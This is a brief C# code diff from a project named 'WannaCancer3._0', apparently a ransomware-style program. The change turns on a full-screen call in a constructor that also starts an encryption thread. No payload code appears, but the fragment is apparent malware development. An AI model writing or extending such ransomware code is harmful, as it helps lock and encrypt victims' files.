@@ -20,7 +20,7 @@ namespace WannaCancer3._0
         public WannaCancer()
         {
             InitializeComponent();
-            //MakeFullScreen();
+            MakeFullScreen();
 
             encrypt = new Thread(StartEncrypt);
             encrypt.Start();       
